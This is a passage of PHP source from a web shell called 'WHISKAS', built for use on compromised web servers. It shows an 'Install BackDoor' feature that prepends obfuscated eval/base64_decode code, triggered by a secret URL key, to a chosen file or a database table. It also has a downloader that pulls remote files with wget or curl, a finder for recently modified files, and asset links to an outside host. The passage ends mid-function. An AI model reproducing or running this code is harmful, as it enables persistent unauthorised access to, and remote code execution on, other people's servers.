ICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCjw/eHBhY2tldCBlbmQ9InciPz6tAuFxAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAAAQLSURBVHja7NhPbxVVGMfxz52ZAlVa+VNApBKo0bi/VeMSMSYibH0FxgVIIRFai7o0RhfGlXFjQqKQYKLR12FNgBCNIYqgLTQRayVtAu3tuODcMnc6M3euiYYFJzm5c5LzO893nue55zxzGmmauh9b5D5tD8AegP3XrVETLs3Mzz7X1eWfu7YEcc5Io2TRtGBOHd3KvwVMa/ZlvI4NeK9H3WvBAVFNT0vwgRETXsWOipkXxE77JCz+IRIjxmvqPg2j08GDXT0X47w5iRnP24P1QZrv27BL5LyXMYvPzIl70L2CaVyo47EYG/FdgHvO7gojW7FT5KKXcAOnA1xd3YG6cDEeCiGdMicx7VkjIWCtgr4Fj4tc9GIw8rk5sWnP1NQdwDVc7Aa2ISwXY8q8PtNG7Q1pWmRkEMMil+zHDL4wL+lBd7AbXIy+sFR7T/vevMR1o3YH7KK2CdtFfvRC8NyZoGvW1FXCxSV/3ynzEjNG7cK6ktzZjCGRn+zDb6uem9GsqSuFi3O7eSfcrRCeXWHGUkEfDB64nIG7q2vW1BXCxV125CkLIazDIdBFHhgIHvg5A7cQwlpPtwYuzkGVw80Gz1UZGRS5ah9+xdmga9bUHcQVXCrzWDncDaOGwt+lyMgjwcg1+zvgbmjW1B1qw8Ul1UAx3KLETaO2VBgZxMMi0xm4u7pmTd0hXIkrSpVsedPeSqYs6vO3ph0lSb0UzpKNItftx9UAF/egO5SUQLXC71IGKg59WSvUDFWttWbUky6p8Fjbydm9+7ABhz3dxcDv+EELE/gWx3rUHUl6KCqPGzDmqTBaLJk1i8urUN/gqAFv9KA7jnNJSbndDl87hOP6vemJ4OOlksX/XF18MnjqqH7HjNTWncCXWEkqoNrn6Cn9Ttq7mmHFbQ6/aOGdDNSYPbV1b+FcwG8lJVDJKtR644bDudeqWPyqFt7F1zhivbGO87JaN4mzuBPAlhsVUG9bZ8JwRaUAf2FmFeorHLEuQG2oqPDv6SZxBrfzYOVQO3NnQ74tYLYA6tGKuqVTVwjVzrG1UA0Thgr3o87F/8hBNYzZGlZc6aorhUIaFUJtD6MqT91kDdS2kFPddZVQSBshE+5Bbe0SvjshaTnVAbWlZLteqxvvBqXDU2pALeJWDkoNqHu6WlDt9j5Sm6WGKnr/qnAST+JjpDbV1p3EY+FjbiBEKqn6Ok976BMYwUc96k70CtXA9pCyfZkKopH5Fig6zOUqjihjJKtrZYqa25nn0vBl7y5WMgdGK3ctlRaUdGkGoJV5kSJdu9DJAnWFaoPdybxZVHAPtpIDzJ8UjQpdFq7t7a5QMmd+K2NMyb1Y9pamUdDL8jYLmNaBaoMt/08Xd2kvF3f37VXnPwMAFrtiYWROMtwAAAAASUVORK5CYII=';
	$s['WHISKASmini']='https://storage.dk-only.site/shell-assest/dk-profile.png';
	$s['loader']='https://storage.dk-only.site/shell-assest/dk-profile.png';
	//return 'data:image/png;base64,'.__get_resource($s[$r]);
	return $s[$r];
}
function WHISKASinbackdoor(){
WHISKAShead();
echo '<div class=header><center><p><div class="txtfont_header">| Install BackDoor |</div></p><h3><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'file\')">| In File | </a><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'db\')">| In DataBase | </a></h3></center>';
$error = '<font color="red">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
$success= '<font color="red">Success...!';
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Whiskas is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='WHISKAS'>Whiskas Uploader</option><option value='my'>My Private Shell</option></select>";
$cwd = 'Example: /home/Whiskas/public_html/index.php';
if($_POST['WHISKAS1']=='file'){
echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='Whiskas'> <input type='submit' value=' '>{$textarea}</form></p></center>");
if($_POST['WHISKAS2']!=''&&$_POST['WHISKAS3']!=''&&$_POST['WHISKAS4']!=''){
$method = $_POST['WHISKAS2'];
$file = $_POST['WHISKAS3'];
$shell = $_POST['WHISKAS4'];
$key = str_replace(array('"','\''),'',trim($_POST['WHISKAS5']));
if($key=='')$key='WHISKAS';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__WHISKAS_SHELL_CODE'];}
$code = '<?php if(isset($_GET["WHISKAS"])&&$_GET["WHISKAS"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?WHISKAS=".$key.'</font>');}else{__alert($error);}}}
if($_POST['WHISKAS1']=='db'){
echo("<center><p><div class='txtfont_header'>| In DataBase |</div></p>".getConfigHtml('all')."<p><form onsubmit=\"g('inbackdoor',null,'db',this.db_host.value,this.db_username.value,this.db_password.value,this.db_name.value,this.file.value,this.method.value,this.shell.value,this.key.value);return false;\">");
$table = array('td1' =>
array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
'td2' =>
array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
'td3' =>
array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
'td4' =>
array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
'td5' =>
array('color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $cwd, 'inputSize' => '50', 'placeholder' => true),
'td6' =>
array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'Whiskas', 'inputSize' => '50')
);
create_table($table);
echo("<p>{$select}</p>");
echo($textarea);
echo("<p><input type='submit' value=' '></p></form></p></center>");
if($_POST['WHISKAS2']!=''&&$_POST['WHISKAS3']!=''&&$_POST['WHISKAS5']!=''&&$_POST['WHISKAS6']!=''){
$dbhost = $_POST['WHISKAS2'];
$dbuser = $_POST['WHISKAS3'];
$dbpw = $_POST['WHISKAS4'];
$dbname = $_POST['WHISKAS5'];
$file = $_POST['WHISKAS6'];
$method = $_POST['WHISKAS7'];
$shell = $_POST['WHISKAS8'];
$key = str_replace(array('"','\''),'',trim($_POST['WHISKAS9']));
if($key=='')$key='WHISKAS';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__WHISKAS_SHELL_CODE'];}
if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
$code = '<?php if(isset($_GET["WHISKAS"])&&$_GET["WHISKAS"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM WHISKAS_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
if(@is_file($file)&&@is_writable($file)){
@mysqli_query($conn,'DROP TABLE `WHISKAS_bc`');
@mysqli_query($conn,'CREATE TABLE `WHISKAS_bc` (code LONGTEXT)');
@mysqli_query($conn,'INSERT INTO `WHISKAS_bc` VALUES("'.$shell.'")');
@file_put_contents($file,$code."\n".@file_get_contents($file));
__alert($success."<br>Run With: ".basename($file)."?WHISKAS=".$key.'</font>');}else{__alert($error);}}}}
echo('</div>');
WHISKASfooter();
}
function WHISKASfindmtime(){
$currentDir = getcwd();
echo("<div class='header'>
<div style='padding:30px;max-width:600px;margin:0 auto;'>
<div style='text-align:center;margin-bottom:20px;'><span style='font-size:40px;'>&#128269;</span></div>
<h2 style='color:#FFF;text-align:center;margin-bottom:20px;text-shadow:0 0 10px rgba(52,152,219,0.5);'>Find Modified Files</h2>
<div style='background:linear-gradient(180deg, #292929 0%, #000000 50%, #1e1e1e 100%);padding:25px;border-radius:12px;border:1px solid #3498db;'>
<form onsubmit=\"g('findmtime',null,this.directory.value,this.timerange.value,'>>');return false;\">
<div style='margin-bottom:15px;'>
<label style='color:#888;font-size:13px;display:block;margin-bottom:5px;'>Directory Path</label>
<input type='text' name='directory' style='width:100%;padding:12px;background:#0a0a15;border:1px solid #333;border-radius:8px;color:#000;font-size:14px;box-sizing:border-box;font-weight:bold;' value='" . htmlspecialchars($currentDir) . "'>
</div>
<div style='margin-bottom:20px;'>
<label style='color:#888;font-size:13px;display:block;margin-bottom:10px;'>Time Range</label>
<div style='display:flex;gap:10px;flex-wrap:wrap;'>
<label style='flex:1;background:#0a0a15;padding:12px;border-radius:8px;cursor:pointer;text-align:center;border:1px solid #333;'><input type='radio' name='timerange' value='1day' checked style='margin-right:5px;'> 1 Day</label>
<label style='flex:1;background:#0a0a15;padding:12px;border-radius:8px;cursor:pointer;text-align:center;border:1px solid #333;'><input type='radio' name='timerange' value='10days' style='margin-right:5px;'> 10 Days</label>
<label style='flex:1;background:#0a0a15;padding:12px;border-radius:8px;cursor:pointer;text-align:center;border:1px solid #333;'><input type='radio' name='timerange' value='1month' style='margin-right:5px;'> 1 Month</label>
</div>
</div>
<button type='submit' style='width:100%;padding:14px;background:linear-gradient(135deg, #00fffa 0%, #0069ff 100%);color:#FFF;border:none;border-radius:8px;cursor:pointer;font-size:16px;font-weight:bold;'>Search Files</button>
</form>
</div>
</div>");
if($_POST['WHISKAS3']=='>>' && !empty($_POST['WHISKAS1'])){
$directory = $_POST['WHISKAS1']; 
$timeRange = $_POST['WHISKAS2']; 
echo "<div style='width:90%;margin:15px auto;'>";
echo __pre();
$currentTime = time();
if($timeRange == '1day') {
$timeLimit = $currentTime - 86400;
} elseif($timeRange == '10days') {
$timeLimit = $currentTime - 864000;
} else {
$timeLimit = $currentTime - 2592000;
}
function findModifiedFiles($dir, $timeLimit) {
$result = array(); 
if(!@is_dir($dir)) return $result;
$files = @scandir($dir);
if(!$files) return $result;
foreach($files as $file) {
if($file != '.' && $file != '..') {
$path = $dir . '/' . $file;
if(@is_dir($path)) { 
$subdirFiles = findModifiedFiles($path, $timeLimit);
foreach($subdirFiles as $subfile) {
$result[] = $subfile;
}
} else { 
$modTime = @filemtime($path); 
if($modTime && $modTime >= $timeLimit) { 
$tempArray = array();
$tempArray['path'] = $path;
$tempArray['mtime'] = date('Y-m-d H:i:s', $modTime);
$result[] = $tempArray;
}}}}
return $result;
}
$modifiedFiles = findModifiedFiles($directory, $timeLimit);
if(count($modifiedFiles) > 0) {
echo "<table border='1' cellpadding='5' cellspacing='1' style='width:100%;margin:0 auto;border-collapse:collapse;border-color:#555;'>";
echo "<tr><th>File Path</th><th width='200'>Modified Time</th></tr>";
foreach($modifiedFiles as $file) { 
echo "<tr><td>" . htmlspecialchars($file['path']) . "</td><td align='center'>" . htmlspecialchars($file['mtime']) . "</td></tr>"; 
}
echo "</table>";
} else { 
echo "<div style='text-align:center;padding:15px;background:transparent;border:1px solid #555;'>No modified files found within the selected time range.</div>"; 
}
echo "</div>";
}
echo("</div>");
}
function WHISKASremotedl(){
WHISKAShead();
echo("<div class='header'><center><p><div class='txtfont_header'>| Upload From Url |</div></p><p>
<form onsubmit=\"g('remotedl',null,this.d.value,this.p.value,'>>');return false;\">
<p><div class='txtfont'>Url: </div>&nbsp;&nbsp;&nbsp;<input type='text' name='d' size='50'></p>
<div class='txtfont'>Path:</div> <input type='text' name='p' size='50' value='".$GLOBALS['cwd']."'><p><input type='submit' value=' '></p>
</form></p></center>");
if(isset($_POST['WHISKAS1'],$_POST['WHISKAS2'],$_POST['WHISKAS3'])&&!empty($_POST['WHISKAS1'])&&$_POST['WHISKAS3']=='>>'){
echo __pre();
$url = $_POST['WHISKAS1'];
$path = $_POST['WHISKAS2'];
echo('<center>');
if(__download($url,$path)){
echo('<font color="red">Success...!</font>');
}else{
echo('<font color="red">Error...!</font>');
}
echo('</center>');
}
echo("</div>");
WHISKASfooter();
}
function __download($url,$path=false){
if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
$saveas = basename(rawurldecode($url));
if($path){$saveas=$path.$saveas;}
if($content = __read_file($url)){
if(@is_file($saveas))@unlink($saveas);
if(__write_file($saveas, $content)){return true;}}
$buff = WHISKASEx("wget ".$url." -O ".$saveas);
if(@is_file($saveas)) return true;
$buff = WHISKASEx("curl ".$url." -o ".$saveas);
